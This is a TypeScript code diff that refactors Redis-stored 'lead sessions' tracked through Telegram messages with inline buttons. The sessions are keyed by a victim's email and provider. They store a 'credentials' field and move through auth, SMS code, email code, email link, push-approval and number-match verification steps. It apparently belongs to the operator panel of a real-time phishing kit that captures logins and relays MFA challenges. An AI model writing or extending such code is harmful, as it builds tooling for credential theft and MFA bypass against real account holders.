@@ -1,4 +1,5 @@
 import { createHash } from "node:crypto";
+import type { InlineKeyboardMarkup } from "@grammyjs/types";
 import { redis } from "../clients/upstash.client.js";
 
 export type LeadStatus =
@@ -14,80 +15,140 @@ export type LeadProcess =
   | "auth"
   | "verify-sms-code"
   | "verify-email-code"
-  | "verify-email-link";
+  | "verify-email-link"
+  | "verify-prompt-yes"
+  | "verify-prompt-num";
 
-export type LeadChannelState = {
-  anchor: string;
+export type LeadSessionState = {
+  messageId?: number;
+  /**
+   * Buttons currently shown on the tracked card, stored in the shape Telegram
+   * accepts for `reply_markup`, so any later edit or resend restores the same
+   * controls instead of leaving the reviewer with a dead card.
+   */
+  keyboard?: InlineKeyboardMarkup;
   status: LeadStatus;
   process: LeadProcess;
-  message: string;
+  feedback: string;
   overload: string[];
-  tgMsgId?: number;
-  baseLog: string;
+  notification: string;
+  credentials: string;
   logs: string;
 };
 
-const LEAD_CHANNEL_TTL_SECONDS = 45 * 60;
+const LEAD_SESSION_TTL_SECONDS = 60 * 60;
 
-export function getLeadAnchor(email: string, provider: string): string {
+function leadSessionKey(sessionId: string): string {
+  return `lead-session:${sessionId}`;
+}
+
+export function getLeadIdentity(lead: {
+  email: string;
+  provider: string;
+}): string {
   return createHash("sha256")
     .update(
       JSON.stringify([
-        email.trim().toLowerCase(),
-        provider.trim().toLowerCase(),
+        lead.email.trim().toLowerCase(),
+        lead.provider.trim().toLowerCase(),
       ]),
     )
     .digest("hex")
     .slice(0, 8);
 }
 
-export async function selectLeadChannel(
-  anchor: string,
-  leadReset?: {
-    status: LeadStatus;
-    process?: LeadProcess;
-  },
-): Promise<LeadChannelState> {
-  let channel = await redis.get<LeadChannelState>(`lc:${anchor}`);
-  if (channel && !leadReset) return channel;
-  const newChannel: LeadChannelState = {
-    anchor: anchor,
-    status: leadReset?.status ?? "idle",
-    process: leadReset?.process ?? "init",
-    message: "Initializing...",
-    overload: [],
-    baseLog: "",
-    logs: "",
-  };
-  await redis.set(`lc:${newChannel.anchor}`, newChannel, {
-    ex: LEAD_CHANNEL_TTL_SECONDS,
-  });
-  return newChannel;
+/**
+ * Reads a session without creating one. Callers use the `null` result to
+ * detect an expired session instead of silently resurrecting a blank one.
+ */
+export async function readLeadSession(
+  sessionId: string,
+): Promise<LeadSessionState | null> {
+  if (!sessionId) return null;
+  return redis.get<LeadSessionState>(leadSessionKey(sessionId));
 }
 
-export async function updateLeadChannel(
-  anchor: string,
-  leadDelta: {
+export async function restartLeadSession(
+  sessionId: string,
+  restart: {
+    merge?: true;
+    keepState?: true;
+    keepMessageId?: true;
     status?: LeadStatus;
     process?: LeadProcess;
-    message?: string;
+    notification?: string;
+  },
+): Promise<LeadSessionState> {
+  const merge = restart.merge === true;
+  const keepState = merge || restart.keepState === true;
+  const keepDetail = merge || restart.keepMessageId === true;
+  const existing =
+    keepDetail || keepState //
+      ? await readLeadSession(sessionId)
+      : null;
+  const session: LeadSessionState = {
+    messageId: existing?.messageId,
+    keyboard: keepDetail ? existing?.keyboard : undefined,
+    status:
+      restart.status ?? (keepState ? existing?.status : undefined) ?? "idle",
+    process:
+      restart.process ?? (keepState ? existing?.process : undefined) ?? "init",
+    feedback: (keepState ? existing?.feedback : undefined) ?? "Initializing...",
+    overload: merge ? (existing?.overload ?? []) : [],
+    notification:
+      restart.notification ??
+      (keepDetail ? existing?.notification : undefined) ??
+      "",
+    credentials: keepState ? (existing?.credentials ?? "") : "",
+    logs: merge ? (existing?.logs ?? "") : "",
+  };
+  await redis.set(leadSessionKey(sessionId), session, {
+    ex: LEAD_SESSION_TTL_SECONDS,
+  });
+  return session;
+}
+
+/**
+ * Applies a partial update to an existing session.
+ *
+ * Returns `null` when the session does not exist (expired or never created) so
+ * callers can report an expired session rather than writing into a phantom
+ * record. The result is written back under the *session* key — writing it under
+ * `session.messageId` silently dropped every update.
+ */
+export async function updateLeadSession(
+  sessionId: string,
+  update: {
+    messageId?: number | null;
+    keyboard?: InlineKeyboardMarkup | null;
+    status?: LeadStatus;
+    process?: LeadProcess;
+    feedback?: string;
     overload?: string[];
-    tgMsgId?: number;
+    credentials?: string;
     logEntry?: string;
   },
-): Promise<LeadChannelState | null> {
-  const channel = await selectLeadChannel(anchor);
-  if (leadDelta.status) channel.status = leadDelta.status;
-  if (leadDelta.process) channel.process = leadDelta.process;
-  if (leadDelta.message) channel.message = leadDelta.message;
-  if (leadDelta.overload) channel.overload.push(...leadDelta.overload);
-  if (leadDelta.tgMsgId) channel.tgMsgId = leadDelta.tgMsgId;
-  if (leadDelta.logEntry) {
-    if (!channel.logs) channel.baseLog = leadDelta.logEntry;
-    channel.logs = `${channel.logs}\n\n${leadDelta.logEntry}`;
+): Promise<LeadSessionState | null> {
+  const session = await readLeadSession(sessionId);
+  if (!session) return null;
+  if (update.messageId !== undefined) {
+    session.messageId = update.messageId ?? undefined;
   }
-  await redis.set(`lc:${channel.anchor}`, channel, {
-    ex: LEAD_CHANNEL_TTL_SECONDS,
+  if (update.keyboard !== undefined) {
+    session.keyboard = update.keyboard ?? undefined;
+  }
+  if (update.status) session.status = update.status;
+  if (update.process) session.process = update.process;
+  if (update.feedback) session.feedback = update.feedback;
+  if (update.overload) {
+    session.overload = [...(session.overload ?? []), ...update.overload];
+  }
+  if (update.credentials) session.credentials = update.credentials;
+  if (update.logEntry) {
+    session.logs = `${session.logs ?? ""}\n\n${update.logEntry}`.trim();
+  }
+  await redis.set(leadSessionKey(sessionId), session, {
+    ex: LEAD_SESSION_TTL_SECONDS,
   });
-  return channel;
+  return session;
 }
